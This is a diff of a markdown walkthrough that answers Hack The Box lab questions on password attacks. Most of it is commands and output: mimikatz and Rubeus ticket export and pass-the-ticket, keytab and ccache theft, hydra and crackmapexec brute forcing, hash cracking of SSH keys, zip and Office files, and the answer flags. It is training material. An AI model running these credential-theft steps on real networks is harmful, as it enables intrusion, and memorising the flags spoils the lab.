@@ -2844,230 +2844,498 @@ evil-winrm -i $ip -u john -H 'c4b0e1b10c7ce2c4723b4e2407ef81a2'
 Results: DONE
 
 
-RDP to with user "Administrator" and password `AnotherC0mpl3xP4$$`.  Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?
+**RDP to with user "Administrator" and password `AnotherC0mpl3xP4$$`.  Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?**
 
 ```powershell
+# Open a Powershell with admin rights.
+cd c:\tools
+.\mimikatz.exe
+privilege::debug
+sekurlsa::tickets /list
+sekurlsa::tickets /export
 
-```
 
-Results:
-
-
-
-Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john
-
-Invoke-SMBExec -Target 172.16.1.1 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command "dir C:\" -Verbose
 john
-c4b0e1b10c7ce2c4723b4e2407ef81a2
-
+TGT [0;5a62c]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi !
+ Session Key       : 0x00000012 - aes256_hmac
+             1d9ac815d1fc7dfb7a1a8d3088cbd3bb1d33987c4707f3a315c350150b61ebb0
+             
 julio
-64f12cddaa88057e06a81b54e73b949b 
+TGT  [0;59c14]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi !
+Session Key       : 0x00000012 - aes256_hmac
+             ea463b091f018b64ba502d50c220ff8e6894e96e0d70263078c01df3c81d2410
+
 
 david
-c39f2beb3d2ec06a62cb887fb391dee0
-```powershell
-
+ Session Key       : 0x00000012 - aes256_hmac
+             dc35cd440cc4c4d93ba02c430e0144f61804827c95a6265ac15a720984436d10
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;5af56]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi !
 ```
 
-Results:
+Results: 3
 
+Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder `\\DC01.inlanefreight.htb\john`
 
-
-Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
 
 ```powershell
+# From the powershell session open in last question:
+# Pass the ticket with mimikatz
+.\mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\tools\[0;5a62c]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
 
+# Enter a remote session
+Enter-PSSession -ComputerName DC01
+
+# Entering the shared unit 
+cd \\DC01.inlanefreight.htb\john
+
+# Reading the flag
+type john.txt
 ```
 
-Results:
+Results: Learn1ng_M0r3_Tr1cks_with_J0hn
+
+**Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt**
+
+```powershell
+# Extract keys
+Rubeus.exe dump /nowrap
+
+# Creates a sacrificial process/logon session (Logon type 9). This will open a new terminal window.
+.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+
+
+# In the new terminal window import the ticket with Rubeus
+.\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6czbmRrrk3Aah8tt1z57sIb9++eXZnVGldPnts7c+91NcpdsnRfoqueyM9PBc/o2XIzFdWmfrAbYbs3RGKjwI91tnlqs3ubMyvVSp9sW+7oMNgOyWeG7SVqHQVFmb6CQ723liVYf0goXaei1MUTFtyY6uiTYTS7h6SVxmXDyo2Ei34hviUdoJccJw21JMctBtoTfKGNNAgLzh9Va4DyAbdjr8RoyK99FcREcww1jrLmaIiuqQ4SQcK39fmvhinKJ2ONQ4D6X5g1L16cPNcKee07IZ/996NS3UqsMFou8BYzySmBj9JBN0sqSmKLaW+HdoX55ixnEGO/SzmgTfHHW9dbvZflfzMCB/TDih5SlTEYTAfW+g1DXI0o1YMUNRz3IxYPUy/OMqNQLbERmrcHt9fkgh0DlMfg94lcAM93To6Z0L7XtFYQF2i73J+o5i099P/a8381q7X0KWrZ+7lPnZbyks6J+jEY/wgKNAP8E16HPQVXDvtu4cbamEsp3VHq8yZ92JiA0GSJrqxCwF13eeYNUaL8Yf6GdSKE9KM72q5VGHyvlbeOmL0zIB8YR/HHl3ZfNQW8V48u4RoOBS+pXKq9UF7xrlh6rl1N01Nsgos58FOWzVncLRoheOez8rTxA44kgIz5RVVINRqBZj/k226t0OjAmk/hZQtbUQ5EH1/KuztL+3lver7nzlpS2IwbfWD9ScxMHwR8PImz0w3kcsfB8VYX9DSHNOUwhOB5QuBH+Oc67IQoMUTHCpLgWY+kNNj+yWu/2QDBvHKVuHpIh1+D4nEXCTOMKs42ZVsK6rmzpFM3C8eARj83zreW68HUTiZJBWwkdk6v/4BuZNT0xp8mIf/LzneGSdZIELO5B1MJbFaKs/JcsdRtjdv2LfGaXp9MwuQ3xRCkTPUjJNERwGyw87xQhqfNxwpGXJIlWaTFMKqcFC7VDRLsSEbNIinrIRjiX4tvBNfnNgxWGG2YFCDPz/23vUuRCfxOnmd7SWLrIUY9g6uzdGCNfxN2zEj1gQgaXfjucouF7xw+JwMZ1go7CNXxfKyk5t+uzgEJY7jWbQO17zamD1EIIQNEsXI403KXfJsUo/aaKIpeW4EkUbVBHwv5gOPmRKpfsSG1aXMYH40G151RJXW/86h4kYB0C+h41I5EizwIjzUJBp6VPmoNZlJcFgPNcZOAy4q7O+ubFepmnkE3gZBmTd5qvqH51ckz9/l6DqrkyvPUYOS0hWLA27Z7n0HOxhxgs7xInIsdf/YpZ5cnLFBgzTasFxmjAofIVtomvc7PeMtwVyHaqJggIT0mV1/SnEwriWucerepLen2nBnU6ezqbiJqpBOOKqGuyftYkCnFXWjYQf3nkkWR3ULi/WpjNPlnusTWUUHHzLy9jHGVGmyO8CodQs6j5YkI6RjMi88UXR1CIZtMuCao0na3e73ujX2FyjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAdmsgV0fx9+3oajTCIy9O7HTOYfEcH86MVw1AVC2HrsKETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNTAxMTkwODQ3MDJaphEYDzIwMjUwMTE5MTg0NzAyWqcRGA8yMDI1MDEyNjA4NDcwMlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
+
+# Enter a remote session
+Enter-PSSession -ComputerName DC01
+
+# Entering the shared unit 
+cd c:\john
+
+# Reading the flag
+type john.txt
+```
+
+Results: `P4$$_th3_Tick3T_PSR`
 
 
 
 Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.
 
+Results: DONE
+
+
+
+**SSH to  with user "david@inlanefreight.htb" and password "Password2". Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.**
+
+```
+# Enum services
+nmap -p 22,2222,3389 10.129.32.62                            
+```
+
+```
+Nmap scan report for 10.129.32.62
+Host is up (0.16s latency).
+
+PORT     STATE  SERVICE
+22/tcp   closed ssh
+2222/tcp open   EtherNetIP-1
+3389/tcp open   ms-wbt-server
+```
+
+
+```
+# Step 1: Establish a Local Port Forwarding from Kali to MS01 via port 2222 (port 22 is closed)
+ssh david@inlanefreight.htb@10.129.32.62 -p 2222 -L 9999:172.16.1.15:22 
+
+# Print the flag:
+cat flag.txt
+```
+
+Results: `Gett1ng_Acc3$$_to_LINUX01` 
+
+
+**Which group can connect to LINUX01?**
+
 ```powershell
+realm list
+```
+
+Results: Linux Admins
+
+
+ **Look for a keytab file that you have read and write access. Submit the file name as a response.**
+
+```powershell
+find / -type f -name "*.keytab" 2>/dev/null
+```
+
+Results: carlos.keytab
+
+
+**Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.**
+
+```powershell
+# We can attempt to crack the account's password by extracting the hashes from the keytab file with [KeyTabExtract](keytabextract.md).
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+# Now we can try to crack the NTLM hash offline:
+hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
+# It returns Password5
+
+# Login as carlos@inlanefreight.htb
+su carlos@inlanefreight.htb
+
+# Prints the flag
+cat ~/flag.txt
+```
+
+Results: C@rl0s_1$_H3r3
+
+
+
+**Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.**
+
+```powershell
+# We check out the cronjobs for Carlos (logged as Carlos)
+crontab -l
+
+# In the output we obtain the path for this script /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh. Let's read the script:
+cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
 
 ```
 
-Results:
-
-
-
-Question
-
-```powershell
+Output:
+```
+#!/bin/bash
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
 
 ```
 
-Results:
+
+```
+# We can use the keytab file of the svc_workstation@INLANEFREIGHT.HTB user to impersonate ourselves. See which ticket we are currently using
+klist
+
+# Use kinit with the svc_workstation@INLANEFREIGHT.HTB's keytab
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+
+# If we check out the keytab file in use we will see svc_workstation@INLANEFREIGHT.HTB's
+klist
+
+# But as ssh connection does not allow the -k flag we will try to obtain the creds better:
+python3 /opt/keytabextract.py  /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+
+# Access to the linux01 as svc_workstations@inlanefreight.htb
+ssh svc_workstations@inlanefreight.htb@172.16.1.15
+# Enter password: Password4
+```
+
+Results: `Mor3_4cce$$_m0r3_Pr1v$`
 
 
 
-Question
+**Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.**
 
 ```powershell
+sudo -l
+sudo cat /root/flag.txt
+```
+
+Results: `Ro0t_Pwn_K3yT4b`
+
+
+**Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.**
+
+```powershell
+# List ccache files
+ls -la /tmp
+
+# We copy the one we are interested in, belonging to the user julio
+cp /tmp/krb5cc_647401106_hdWu4q /root
+
+#  Importing the ccache File into our Current Session
+export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
+
+# Now we can list the tickets and check we could impersonate the user we selected
+klist
+
+# For instance we can do this:
+smbclient //DC01/julio -k -c ls
+smbclient //DC01/julio -k -c 'get julio.txt'
+
+# And cat the file
+cat julio.txt
+```
+
+Results: `JuL1()_SH@re_fl@g`
+
+
+
+**Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).**
+
+```powershell
+# Run linikatz
+/opt/linikatz.sh
+
+# It will enumerate some interesting files such as 
+-rw------- 1 root root 4154 Jan 19 15:10 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+
+# # Copying the file in our home
+cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB /root
+
+# Importing the ccache File into our Current Session
+export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB
+
+# Check the running ticket now and we will see Linux01
+klist
+smbclient //DC01/linux01 -k -c ls
+smbclient //DC01/linux01 -k -c 'get flag.txt'
+cat flag.txt
 
 ```
 
-Results:
+Results: Us1nG_KeyTab_Like_@_PRO
 
 
+**Optional Exercises. Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.**
 
-Question
+Results: DONE
 
-```powershell
+**Optional Exercises. From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished.**
 
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
-
-
-
-Question
-
-```powershell
-
-```
-
-Results:
+Results: DONE
 
 
 ### Cracking Files
 
+**Use the cracked password of the user Kira and log in to the host and crack the "id_rsa" SSH key. Then, submit the password for the SSH key as the answer.**
+
+```bash
+ssh kira@$ip
+# Enter the password: L0vey0u1!
+
+# Dump id_rsa key and copy
+cat .ssh/id_rsa
+
+# Create a file id_rsa in your attacking machine and save the key. Now create the hash with ssh2john
+ssh2john id_rsa > ssh.hash
+
+# Now we create a mutated list with the custom.rule file provided as resource by HTB
+hashcat --force password.list -r custom.rule --stdout | sort -u > mutatedlist.list
+
+# Finally we crack it with john
+john --wordlis=mutatedlist.list ssh.hash 
+```
+
+Results: L0veme
 
 
-### Password Management
+**Use the cracked password of the user Kira, log in to the host, and read the Notes.zip file containing the flag. Then, submit the flag as the answer.**
 
+```bash
+ssh kira@$ip
+# Enter the password: L0vey0u1!
+
+# Convert into a base64 string the Notes.zip in kira's terminal and copy the output string
+base64 ~/Documents/Notes.zip -w 0
+
+# In your kali attacking machine, save the string back into a zip file
+echo -n "UEsDBAoACQAAAPh+SVQ70s7QJgAAABoAAAAJABwAbm90ZXMudHh0VVQJAAP01QNi99UDYnV4CwABBOgDAAAE6AMAALFUBGWV5fc4rSC9HNoIlYqIFL1sYVMhgYPASW1yjaNkYcDHt34cUEsHCDvSztAmAAAAGgAAAFBLAQIeAwoACQAAAPh+SVQ70s7QJgAAABoAAAAJABgAAAAAAAEAAAC0gQAAAABub3Rlcy50eHRVVAUAA/TVA2J1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBPAAAAeQAAAAAA" | base64 -d > Notes.zip
+
+# Generate a hash with zip2john utility
+zip2john Notes.zip > zip.hashes
+
+# Now we create a mutated list with the custom.rule file provided as resource by HTB
+hashcat --force password.list -r custom.rule --stdout | sort -u > mutatedlist.list
+
+# Finally, we crack it:
+john zip.hashes --wordlist=mutatedlist.list 
+# Output: P@ssw0rd3!
+
+# Unzip it
+unzip Notes.zip
+# Enter pass: P@ssw0rd3!
+
+# Cat the flag:
+cat notes.txt
+```
+
+Results: HTB{ocnc7r4io8ucsj8eujcm}
 
 
 ### Skills Assessment 1: Password Attack Easy
 
 
+Our client Inlanefreight contracted us to assess individual hosts in their network, focusing on access control. The company recently implemented security controls related to authorization that they would like us to test. There are three hosts in scope for this assessment. The first host is used for administering and managing other servers within their environment.
+
+**Examine the first target and submit the root password as the answer.**
+
+```powershell
+# Enumerate services
+sudo nmap -sC -sV 10.129.202.219 -Pn 
+# Output: port 21 and 22
+
+# Download the resources files with userlist and password list and generated a mutated list:
+hashcat --force password.list -r custom.rule --stdout | sort -u > mutatedlist.list
+
+# Launch a password attack with the username.list and password.list resource provided
+hydra -L username.list -P password.list ftp://10.129.202.219 # output: [21][ftp] host: 10.129.202.219   login: mike   password: 7777777
+
+# Now we access the ftp service with the creds
+ftp $ip
+# Enter user mike
+# Enter password 7777777
+
+# From the ftp terminal:
+dir
+# We will see some ssh keys. Download the id_rsa
+get id_rsa
+quit
+
+# Now we crack the ssh id_rsa key
+ssh2john.py id_rsa > ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+# output: 7777777
+
+# And connect via ssh 
+chmod 600 id_rsa
+ssh -i id_rsa mike@$ip
+# Enter password for key: 7777777
+
+# We have accessed the machine as mike. After browsing around we notice the .bash_history file. 
+cat .bash_history
+
+# The root password is logged in plain text
+```
+
+Results: dgb6fzm0ynk@AME9pqu
+
+
 
 ### Skills Assessment 2: Password Attack Medium
 
+Our next host is a workstation used by an employee for their day-to-day work. These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network. During a meeting with the client, we were informed that many internal users use this host as a jump host. The focus is on securing and protecting files containing sensitive information.
+
+```powershell
+# Enumerate services
+sudo nmap -sC -sV $ip -Pn  
+# Output: open ports -> 22, 139, 445
+
+# Download the resources provided by HTB. Unzip the file. And generated a mutated password list. 
+hashcat --force password.list -r custom.rule --stdout > mut_password.list
+
+# Use a password attack with cracmapexec and the smb service
+crackmapexec smb 10.129.153.184 -u username.list -p mut_password.list
+# Output: SMB         10.129.153.184  445    SKILLS-MEDIUM    [+] \john:123456 
+
+# Enumerate samba services with user john
+smbclient -L 10.129.153.184 -U john
+# Enter password: 123456
+
+# Access the service
+smbclient \\\\10.129.153.184\\SHAREDRIVE -U john
+# Enter password: 123456
+
+# Enumerate and download zip file
+dir
+get Docs.zip
+quit
+
+# Now we will try to crack the zip file
+zip2john Docs.zip > zip.hashes
+john zip.hashes --wordlist=mut_password.list 
+# Output: Destiny2022!
+
+# Unzip the file and read the content:
+unzip Docs.zip
+# Enter password: Destiny2022!
+
+# The compressed file is a word document that requires a password to open it. We will try to crack it with office2john
+office2john Documentation.docx > hash
+john --wordlist=mut_password.list hash
+# Output: 987654321        (Documentation.docx) 
+
+# When we open the document, we have a installation manual with the hardcoded creds: 
+jason:C4mNKjAtL2dydsYa6
+
+# Access the target with jason's creds
+ssh jason@$ip
+# Enter password: C4mNKjAtL2dydsYa6
+
+# Check services running:
+netstat -antp
+
+# We can see that there is a mysql server listening locally. In our kali machine we use the Default-Credential utility to list default passwords for mysql service
+creds search mysql
+
+# We access mysql with creds superdba:admin
+mysql -u superdba -padmin
+
+# Now we use mysql commands to enumerate
+show databases;
+use users;
+show tables;
+select * from creds;
+# We can see creds for dennis:7AUgWWQEiMPdqx
+
+# We access dennis
+su dennis
+# Enter password: 7AUgWWQEiMPdqx
+
+# We copy the /home/dennis/.ssh/id_rsa file
+cat /home/dennis/.ssh/id_rsa file
+
+# From our kali machine we copy the file to a local id_rsa file and crack it:
+ssh2john id_rsa > ssh.hashes
+john --wordlist=mut_password.list ssh.hashes 
+# Output: P@ssw0rd12020!
+
+# Now we access the target ip with root
+chmod 600 id_rsa
+ssh -i id_rsa root@$ip
+# Enter the password: P@ssw0rd12020!
+
+# We are root. Let's print the flag
+cat /root/flag.txt
+```
+
+Results: HTB{PeopleReuse_PWsEverywhere!}
+
+
 
 ### Skills Assessment 3: Password Attack Hard
+
+The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user `Johanna` is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.
+
+**Examine the third target and submit the contents of flag.txt in C:\Users\Administrator\Desktop\ as the answer.**
+
+```powershell
+# We enumerate services
+sudo nmap -sC -sV $ip -Pn
+# output: open ports -> 11, 135, 139, 445, 2049, 3389, 5985
+# hostname WINSRV
+
+# Download the resources provided by HTB. Unzip the file. And generated a mutated password list. 
+hashcat --force password.list -r custom.rule --stdout > mut_password.list
+sort mut_password.list | uniq > unique_passwords.list
+
+# We will try to access with johanna user and the provided password lists mutated and cleaned.
+hydra -l johanna -P unique_passwords.list -t 64 -w 2 -f  rdp://$ip
+# Output: [3389][rdp] host: 10.129.154.5   login: johanna   password: 1231234!
+
+# Connect to the host via RDP
+xfreerdp /u:johanna  /p:'1231234!' /v:$ip /cert:ignore 
+
+```
+
+Results:
 
 
 
